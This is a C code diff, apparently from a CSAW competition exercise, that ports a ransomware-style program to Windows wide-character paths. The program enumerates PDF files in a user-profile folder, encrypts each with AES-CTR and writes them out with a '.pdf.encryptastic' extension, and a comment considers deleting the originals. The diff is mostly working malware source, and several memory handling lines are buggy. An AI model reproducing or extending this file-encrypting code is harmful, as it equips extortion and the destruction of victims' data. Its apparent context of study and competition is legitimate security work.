@@ -69,13 +69,13 @@ Struct Gin(){
 
 
 // AES-CTR
-int inkripshun(char* basePath, char* infilename, Struct *mats){
+int inkripshun(wchar_t* basePath, wchar_t* infilename, Struct *mats){
 
     printf("In inkripshun");
     FILE *infile;
     FILE *outfile;
 
-    infile = fopen(infilename, "rb");
+    infile = _wfopen(infilename, L"rb");
          if (!infile) {
         /* Unable to open file for reading */
         fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
@@ -111,23 +111,26 @@ int inkripshun(char* basePath, char* infilename, Struct *mats){
     SHA256_Final(hash, &sha256);
     printf("%02x", hash);
     
+    // convert char* to LPWSTR                            
+    wchar_t* wide_hash = malloc(64);
+    MultiByteToWideChar(CP_ACP, 0, hash, -1, wide_hash, 33);
 
     rewind(infile);    
     
 
-    char outfileName[(strlen(basePath) + SHA256_DIGEST_LENGTH + 17)];
+    wchar_t* outfileName = malloc(wcslen(basePath) + SHA256_DIGEST_LENGTH + 17);
     //char outfileName[strlen(infilename) + 13];
     //strcpy(outfileName,infilename);
-    printf(outfileName);
-    strcat(outfileName, basePath);
-    printf(outfileName);
-    strcat(outfileName, hash);
-    printf(outfileName);
-    strcat(outfileName,".pdf.encryptastic");
-    printf(outfileName);
+    wprintf(outfileName);
+    wcsncat(outfileName, basePath, wcslen(basePath));
+    wprintf(outfileName);
+    wcscat(outfileName, wide_hash);
+    wprintf(outfileName);
+    wcscat(outfileName,L".pdf.encryptastic");
+    wprintf(outfileName);
     
 
-    outfile = fopen(outfileName, "wb");
+    outfile = _wfopen(outfileName, L"wb");
     if (!outfile) {
         /* Unable to open file for writing */
         fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
@@ -210,7 +213,7 @@ int inkripshun(char* basePath, char* infilename, Struct *mats){
     EVP_CIPHER_CTX_cleanup(ctx);
 
     // Delete original file?  
-    
+    free(outfileName);
     return 0;
 };
 
@@ -244,25 +247,40 @@ int main(){
     Struct key_iv = Gin();
 
     // Check CWD name
-    char* directoryPath = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");    
-    char directoryDupe[strlen(directoryPath) + 1];
-    strcpy(directoryDupe, directoryPath);
-    char basePath[strlen(directoryPath) + 1];
-    strcpy(basePath, directoryPath);
+    wchar_t *directoryPath = (wchar_t *) malloc(MAX_PATH*2);
+    wcsncpy(directoryPath, _wgetenv(L"USERPROFILE"), (MAX_PATH - 22));
+    wcsncat(directoryPath, L"\\SecretCSAWDocuments\\", 22);  
+    
+    wchar_t *directoryDupe = (wchar_t *) malloc(MAX_PATH*2);
+    wcsncpy(directoryDupe, directoryPath, MAX_PATH);
+    
+    wchar_t *basePath = (wchar_t *) malloc(MAX_PATH*2);
+    wcsncpy(basePath, directoryPath, MAX_PATH);
 
-    if (PathFileExistsA(directoryPath)) {
+    wchar_t *fileToEncryptPath = malloc(MAX_PATH);
+
+
+    if (PathFileExistsW(directoryPath)) {
         // Loop through files in directory
-        WIN32_FIND_DATA data;
-        HANDLE hFind = FindFirstFile(strcat(directoryPath, "*.pdf"), &data);
+        WIN32_FIND_DATAW data;
+        wcsncat(directoryPath, L"*.pdf", 6);
+        HANDLE hFind = FindFirstFileW(directoryPath, &data);
         if( hFind != INVALID_HANDLE_VALUE){
             do{
                 printf("%s\n",data.cFileName);
-                inkripshun(basePath,strcat(directoryDupe,data.cFileName), &key_iv);
-            } while (FindNextFile(hFind, &data));
+                wcsncpy(fileToEncryptPath, directoryDupe, MAX_PATH);
+                wcsncat(fileToEncryptPath, data.cFileName, (wcslen(data.cFileName)));
+                inkripshun(basePath,fileToEncryptPath, &key_iv);
+                memset(fileToEncryptPath, 0, MAX_PATH);
+            } while (FindNextFileW(hFind, &data));
             FindClose(hFind);
         };
 
     } else {
         printf("Did not find the CSAW secret directory.\n");
     }
+
+    free(directoryPath);
+    free(basePath);
+    free(directoryDupe);
 }
